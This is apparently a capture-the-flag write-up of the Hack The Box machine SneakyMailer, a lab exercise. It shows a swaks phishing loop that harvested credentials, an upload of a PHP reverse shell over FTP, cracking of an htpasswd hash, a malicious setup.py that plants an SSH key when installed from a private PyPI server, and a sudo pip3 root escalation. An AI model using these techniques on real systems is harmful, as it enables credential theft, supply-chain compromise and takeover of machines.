---
title: "Hack The Box - SneakyMailer"
tags: [linux,medium,phishing,swaks,pypi]
categories: HackTheBox

---

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled.png)

Link: [https://www.hackthebox.eu/home/machines/profile/262](https://www.hackthebox.eu/home/machines/profile/262)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Employee - Dashboard
143/tcp  open  imap     
(released 2018)
|_imap-capabilities: UIDPLUS THREAD=ORDEREDSUBJECT STARTTLS IDLE completed QUOTA IMAP4rev1 SORT OK CAPABILITY THREAD=REFERENCES UTF8=ACCEPTA0001 CHILDREN ACL2=UNION NAMESPACE ENABLE ACL
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
|_imap-capabilities: UIDPLUS THREAD=ORDEREDSUBJECT IDLE completed QUOTA IMAP4rev1 SORT OK CAPABILITY THREAD=REFERENCES UTF8=ACCEPTA0001 ENABLE CHILDREN AUTH=PLAIN NAMESPACE ACL2=UNION ACL
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP Enumeration

When I tried to access the webpage using IP it redirects me to `sneakycorp.htb` so added it to `/etc/hosts`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%201.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%201.png)

It just seems like an normal webpage 

I tried subdomain enumeration and got another one. Added that too.

```bash
root@kali:~# gobuster vhost -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt -u http://sneakycorp.htb/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://sneakycorp.htb/
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2020/07/12 10:10:50 Starting gobuster
===============================================================
Found: dev.sneakycorp.htb (Status: 200) [Size: 13742]
```

And this seems the same too but there is a register option.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%202.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%202.png)

This looks just a dummy one.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%203.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%203.png)

We Know Port 8080 is open and also running `nginx` so I tried to find anyother subdomain there and got another one.

```bash
root@kali:~# gobuster vhost -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt -u http://sneakycorp.htb:8080
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://sneakycorp.htb:8080
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2020/07/12 13:11:51 Starting gobuster
===============================================================
Found: pypi.sneakycorp.htb:8080 (Status: 200) [Size: 1017]
```

So its running `pypiserver` and when I tried to access `/simple or /package` it asks me for password.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%204.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%204.png)

Another Dead End.

## Phishing Attack

Since we found lot of emails from `team.php` I created the wordlist of it

```bash
curl http://sneakycorp.htb/team.php -o team.php
****c**at team.php | grep @sneakymailer.htb | awk -F"<td>" '{print $2}' | awk -F"</td>" '{print $1}' > mail.txt**
```

I decided to send them mails, for that we can use `telnet` too but I want to automate the stuff, so I created a quick bash script. Using `swaks` tool I gonna do this.

> Swaks is a featureful, flexible, scriptable, transaction-oriented SMTP tool

Started the script in one terminal and nc listening on another one.

```bash
for E in `cat /root/CTF/HTB/Boxes/SneakyMailer/mail.txt`
do
     swaks --to $E --from carastevens@sneakymailer.htb --data 'Subject: Password Needed\n\nhttp://10.10.14.20'
     [ $? -ne 0 ] && echo $E
done
```

I got a hit and it contains user `paulbyrd` password.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%205.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%205.png)

Its URL encoded so I decoded to get the clear text.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%206.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%206.png)

I tried in `pypi` with this, didn't worked so I decided to login the mail.

```bash
paulbyrd : ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```

## Getting a Shell

`Evolution` is a good tool to check the mail and we know **IMAP** (Internet Message Access Protocol)  is open so I logged in with the creds we got.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%207.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%207.png)

There is 2 Message, One is about `Pypi` testing and another one contains `developer` password.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%208.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%208.png)

Again I tried with Pypi it failed so I switched to FTP.

```bash
developer : m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
```

And It worked, Im in and there I can see `dev` folder maybe its connected to `dev.sneakycorp.htb` so I uploaded a php reverse shell in it.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%209.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%209.png)

And Tried to access it in from the web and I got shell as `www-data`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%2010.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sneakymailer/Untitled%2010.png)

## Getting User Shell

We already know there is Pypi server running in `pypi.sneakycorp.htb`, so it must have the web directory.

### What is Pypi?

The Python Package Index, abbreviated as PyPI and also known as the Cheese Shop, is the official third-party software repository for Python. Some package managers, including pip, use PyPI as the default source for packages and their dependencies

Like always I started checking all directories and found `/var/www/pypi.sneakycorp.htb`, It contains `Pypi` hash.

```bash
$ ls -la
ls -la
total 20
drwxr-xr-x 4 root root     4096 May 15 14:29 .
drwxr-xr-x 6 root root     4096 May 14 18:25 ..
-rw-r--r-- 1 root root       43 May 15 14:29 .htpasswd
drwxrwx--- 2 root pypi-pkg 4096 Jul 12 09:37 packages
drwxr-xr-x 6 root pypi     4096 May 14 18:25 venv
$ cat .htpasswd
cat .htpasswd
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
```

Checking the running process, I found that `low` user is running some Install Modules, so low using is handling the Pypi.

```bash
www-data@sneakymailer:/$ ps auxww | grep low
ps auxww | grep low
low       1076  0.0  0.5  29952 20912 ?        Ss   Jan02   0:46 /home/low/venv/bin/python /opt/scripts/low/install-modules.py
www-data 17701  0.0  0.0   3084   884 pts/0    S+   08:02   0:00 grep low
```

Cracked the hash which we just found from `.htpasswd` using John

```bash
root@kali:~/CTF/HTB/Boxes/SneakyMailer# john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
soufianeelhaoui  (?)
1g 0:00:01:15 DONE (2020-07-12 19:11) 0.01316g/s 47048p/s 47048c/s 47048C/s soul17soul17..souderton16
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Since user `low` running it, I decided to create a python package and upload it

> [https://www.linode.com/docs/applications/project-management/how-to-create-a-private-python-package-repository/](https://www.linode.com/docs/applications/project-management/how-to-create-a-private-python-package-repository/)

### Creating setup.py

`setup.py` is the build script for [setuptools](https://packaging.python.org/key_projects/#setuptools). It tells setuptools about your package (such as the name and version) as well as which code files to include.

Here I add my pub key to write in `/home/low/.ssh/authorized_keys`

```bash
import setuptools

try:
    with open("/home/low/.ssh/authorized_keys", "a") as f:
        f.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCVimm0/eOqfQP8vd/1YBU3SucOEpLM7Png9A1d0Po2slhQY2rbrxdKKDRVG1qm7TaXdq0KSoNrDzCYmPjLomKQcuLLlt0HDveNja3/ZhsZyotIr4NUU8vx545X2ZW2CPJWzJo1AllJtsLxGKjxWnbzqcW9QZh77QkCwCfApYWEXzsMEFWplUmRRNqS5uM5380n4YY/Wn1Gu6IqGuIu2nEE594BGB7q1k+jliosL+x8u2qLaOKlifRduqmHcW0eypD3Ye4i8UqlZgKMVUbTcYHH3GjpEhLNQNSsOyHxKEp3u7skvdyQFheNGuYKcS6QFskYG2WeOwizyqhlxnNAZUDfn7oH01zBEMqt9/1BZGBZinuUKlD5mFpY3h6GAnlC3tlAvQ0hFUnk8sovR6f1o+4xt9pkvh8+cRj3VGWq219g8S3T4f+2nXKYkuNnTVL7JttfA+e7a87wwljhcEe+a8Aoaa9KYOIFlHIku2cT2nrw7f1Y7Rr+TK75ET5ouiCta5s= root@kali")
        f.close()

except Exception as e:
    pass

setuptools.setup(
    name="wolf", # Replace with your own username
    version="0.0.1",
    author="wolf",
    author_email="wolf@sneakymailer.htb",
    description="idk",
    long_description="idk",
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
)
```

### Creating .pypirc

.pypirc file is used to simplify the authentication process of uploading a package to the server. It had the most of the things predefined, the user and password and the host already defined.

It should be on $HOME dir of user who is pushing the package to the server

`.pypirc`

```bash
[distutils]
index-servers =
    local

[local]
repository = http://pypi.sneakycorp.htb:8080/
username = pypi
password = soufianeelhaoui
```

I moved to `/tmp` folder and create folder called `pwn` and make that as HOME Directory. Now When I try to install the `setup.py`

```bash
$ export HOME=$(pwd)
$ env
env
USER=www-data
HOME=/tmp/pwn
OLDPWD=/tmp
PWD=/tmp/pwn
$ ls -la
ls -la
total 16
drwxrwxrwx  2 www-data www-data 4096 Jul 12 10:52 .
drwxrwxrwt 11 root     root     4096 Jul 12 10:52 ..
-rw-rw-rw-  1 www-data www-data  135 Jul 12 10:50 .pypirc
-rw-rw-rw-  1 www-data www-data 1230 Jul 12 10:40 setup.py
$ python3 setup.py sdist upload -r local
python3 setup.py sdist upload -r local
running sdist
running egg_info
creating wolf.egg-info
writing wolf.egg-info/PKG-INFO
writing dependency_links to wolf.egg-info/dependency_links.txt
writing top-level names to wolf.egg-info/top_level.txt
writing manifest file 'wolf.egg-info/SOURCES.txt'
reading manifest file 'wolf.egg-info/SOURCES.txt'
writing manifest file 'wolf.egg-info/SOURCES.txt'
warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md

running check
creating wolf-0.0.1
creating wolf-0.0.1/wolf.egg-info
copying files to wolf-0.0.1...
copying setup.py -> wolf-0.0.1
copying wolf.egg-info/PKG-INFO -> wolf-0.0.1/wolf.egg-info
copying wolf.egg-info/SOURCES.txt -> wolf-0.0.1/wolf.egg-info
copying wolf.egg-info/dependency_links.txt -> wolf-0.0.1/wolf.egg-info
copying wolf.egg-info/top_level.txt -> wolf-0.0.1/wolf.egg-info
Writing wolf-0.0.1/setup.cfg
creating dist
Creating tar archive
removing 'wolf-0.0.1' (and everything under it)
running upload
Submitting dist/wolf-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080/
Server response (200): OK
WARNING: Uploading via this command is deprecated, use twine to upload instead (https://pypi.org/p/twine/)
```

`Server Response (200): OK` All Good then.

Using the Private key I logged in as `low` and did `sudo -l` 

It seems I can run `pip3` as root without password.

```bash
low@sneakymailer:~$ sudo -l
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3
```

## Privilege Escalation

Checked GTFObins

> [https://gtfobins.github.io/gtfobins/pip/#sudo](https://gtfobins.github.io/gtfobins/pip/#sudo)

By following that, It spawn shell as root

```bash
low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
low@sneakymailer:~$ sudo pip3 install $TF
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /tmp/tmp.PrKnMj0dSd
# whoami
root
# hostname; id; whoami
sneakymailer
uid=0(root) gid=0(root) groups=0(root)
root
```

We own the box.